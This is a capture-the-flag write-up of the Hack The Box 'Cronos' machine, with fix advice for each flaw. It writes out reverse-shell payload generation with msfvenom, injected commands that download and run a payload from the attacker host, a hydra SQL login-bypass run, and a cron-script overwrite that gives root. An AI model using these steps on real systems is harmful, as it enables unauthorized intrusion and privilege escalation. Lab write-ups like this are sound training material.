# HTB Cronos 

Cronos is a medium rated retired Linux box that seems focused on DNS enumeration, web based injection attacks and exploitation of insecure cron jobs. It was release 3 March, 2017. 

## Service enumeration 

During initial scans, 3 services were found. 


|Port|Service|Version|Notes|
|-|-|-|-|
|TCP 22|SSH|OpenSSH 7.2p2||
|TCP 80|HTTP|Apache httpd 2.4.18|Appears to be default config|
|TCP 53|DNS|ISC BIND 9.10.3-P4||

DNS would be critical to finding the path to exploitation on this box, while the HTTP and SSH servers yielded very little. 

### Nmap Scan results 

```
Nmap scan report for 10.129.227.211
Host is up, received user-set (0.17s latency).
Scanned at 2023-02-15 23:07:52 UTC for 855s
Not shown: 985 closed tcp ports (reset)
PORT      STATE    SERVICE        REASON                              VERSION
22/tcp    open     ssh            syn-ack ttl 63                      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp    open     domain         syn-ack ttl 63                      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp    open     http           syn-ack ttl 63                      Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
749/tcp   filtered kerberos-adm   host-unreach from 10.10.14.1 ttl 64
1106/tcp  filtered isoipsigport-1 host-unreach from 10.10.14.1 ttl 64
1199/tcp  filtered dmidi          host-unreach from 10.10.14.1 ttl 64
2301/tcp  filtered compaqdiag     host-unreach from 10.10.14.1 ttl 64
2968/tcp  filtered enpp           host-unreach from 10.10.14.1 ttl 64
3827/tcp  filtered netmpi         host-unreach from 10.10.14.1 ttl 64
5877/tcp  filtered unknown        host-unreach from 10.10.14.1 ttl 64
8333/tcp  filtered bitcoin        host-unreach from 10.10.14.1 ttl 64
9003/tcp  filtered unknown        host-unreach from 10.10.14.1 ttl 64
9595/tcp  filtered pds            host-unreach from 10.10.14.1 ttl 64
50001/tcp filtered unknown        host-unreach from 10.10.14.1 ttl 64
51103/tcp filtered unknown        host-unreach from 10.10.14.1 ttl 64
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
## External Enumeration and Initial Access


### TCP 53: DNS 

Searchsploit was queried in an attempt to see if any public exploits were known for this version of ISC BIND, however, nothing actionable was discovered. 

Instead, basic enumeration leaked information that was useful for finding a way forward. 

```

nslookup 10.129.227.211 10.129.227.211
211.227.129.10.in-addr.arpa	name = ns1.cronos.htb.

```

This revealed the ns1.cronos.htb domain, and thus also the cronos.htb domain. These were added to /etc/hosts so as to enumerate services only accessable to those hostnames. 

### cronos.htb:53 

Dig was utilized to probe for further subdomains: 

[![](/cronos/dig.png)](/cronos/dig.png)

This produced the discovery of admin.cronos.htb

### admin.cronos.htb:80 

The landing page for this site appeared to be an administrative logon panel. 

[![](/cronos/adminlanding.png)](/cronos/adminlanding.png)

Several commmon password attempts were tried, such as "admin:admin", "cronos:cronos", "user:user", etc, however none of these worked. 

#### SQLmap 

SQLMap was utilized to attempt to discover sql injection vulnerabilities against the login field. 

This revealed that the username field was injectable, however, the tool only identified blind time based sql injection, and failed to identify a way to reveal either credentials or a way to bypass the logon. 

#### SQL logon bypass attempts 

Knowing that *some* sort of SQL injection was possible with the username field, [Hacktricks' SQL logon bypass list](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass) was saved locally as "sql_injections.txt" and passed to the web application using hydra to identify which, if any, injection payloads could successfully bypass the logon. 

```

hydra -l "" -P ~/sql_injections.txt admin.cronos.htb http-post-form "/:username=^PASS^&password=:Your Login Name or Password is invalid" 

```
This produced a large number of working payloads that enabled logon bypass. 

See [this file](/cronos/injections.txt) for a list of all working payloads as produced by hydra. 

#### Command injection and initial access 

After bypassing the logon, the site redirected to admin.cronos.htb/welcome.php, which appeared to be some sort of internal network tool. 

[![](/cronos/welcome.png)](/cronos/welcome.png)


Inspecting this, it appeared to use a function like exec() to pass commands to the operating system. This was then tested for command injection, which yielded a success: 

[![](/cronos/injection.png)](/cronos/injection.png)

A shell payload was then created and served from the attack machine via python3: 

```
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.11 LPORT=443 -f elf  > shell.elf

```

Injection was then used to download the payload: 

```
8.8.8.8 & wget http://10.10.14.11/shell.elf
```

Success was confirmed on the local http server: 

```
10.129.227.211 - - [16/Feb/2023 01:09:00] "GET /shell.elf HTTP/1.1" 200 
```

Finally, initial access was gained by adding execution permissions and then running the payload:

```
8.8.8.8 & chmod +x shell.elf
8.8.8.8 & ./shell.elf
```

This produced a use level shell running as www-data. 

[![](/cronos/usershell.png)](/cronos/usershell.png)

### Vulnerability explanation: Injection Attacks 

When user input is not sanitized between an application's front end and back end, user's may be capable of using special characters to inject additional, unintended commands into an application in order to gain arbitrary command execution. 

### Vulnerability Fix 

#### For http://admin.cronos.htb/ 

This webpage is vulnerable to SQL injection. 

- consider using functions such as mysql_real_escape_string() to sanitize user input. 
- Consider developing IPS detections to deny HTTP POST traffic containing the above listed SQL injection payloads. 

#### For http://admin.cronos.htb/welcome.php

This tool is vulnerable to OS shell command injection.


- consider filtering common command shell redirection and escape sequences such as &, &&, `, and similar
- as these are network tools that can only accept an IP address as input, please consider filtering all input that cannot be validated as an IP address
- if feasible, reimplement these applications natively in PHP instead of relying on passthrough to the operating system
- since this box already has public facing SSH, consider not implementing these tools in the web interface at all, and set up a limited account that can be remotely accessed from whitelisted IP addresses to perform these tasks. 
- develop IPS detections to block HTTP POST traffic containing shell redirection and escape sequences.

### Proof of Concept Code: 

N/A. This vulnerability did not require exploit code to be exploited. 

### Proof Files: 

#### User.txt Screenshot 
[![](/cronos/userproof.png)](/cronos/userproof.png)

#### User.txt Contents

db1d59a7b6118890bfa0e0265bbe747a

## Internal Enumeration and Privilege Escalation 

Several basic enumeration techniques such as checking sudo -l and for SUID on vulnerable applications was attempted but did not result in any actionable results. 

Following this initial round, [LinPeass](https://github.com/carlospolop/PEASS-ng) was uploaded to machine through the Python HTTP server. 

Full output can be seen [here](/cronos/peas.txt), however the formatting is a bit difficult to read. 

#### Exploitable Cron Job discovered 

Within the output from LinPeass, the following line was noted under a section that seemed to concern cronjobs. 

```
* * * * *	[1;31mroot[0m	php [1;31;103m/var/www/laravel[0m/artisan schedule:run >> /dev/null 2>&1

```

More clearly, this was a cronjob to run /var/www/laravel/artisan at a fixed interval as root. 

As the www-data user, it was presumed that read/write access to laravel would be granted, as laravel is a web framework. This was confirmed, and the file "artisan" was determined to be a PHP script. 

With this in mind, a secondary shell payload was prepared and brought over to the target via HTTP: 


```

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f elf  > adshell.elf

```

Subsequently, the following line was used to modify the artisan script: 

```

echo '<?php exec("/var/www/admin/adshell.elf");?>' > artisan

```

After a short interval, the cronjob ran the script as root, which resulted in a reverse TCP shell being returned with root privileges: 

[![](/cronos/rootshell.png)](/cronos/rootshell.png)

### Vulnerability explanation: unsecure scheduled tasks 

Cron.d is a system for task schduling in Linux, which can run scripts or other applications at fixed intervals with various user permissions. 

With this task set to run as root, but with the executed script being writable by a user level account, this effectively gives the user level account the ability to arbitrarily run code as root. 

### Vulnerability fix 

- consider removing www-data's ability to write to /var/www/laravel/artisan 
- If this account *must* write to this file in order to fulfil its role, please consider granting limited sudo access that is password protected in order to accomplish this. 
- consider running this cronjob under a less privileged account.
- consider a real time antivirus or endpoint detection system to monitor for the use of suspicious remote access tools such as meterpreter. 


### Proof of Concept Code

N/A. This vulnerability was exploited without the use of specific exploit code. 

### Proof Files 

#### Root.txt Screenshot 

[![](/cronos/rootproof.png)](/cronos/rootproof.png)

#### Root.txt Contents

4b6a81cb96dc2434a600bd607b28991f










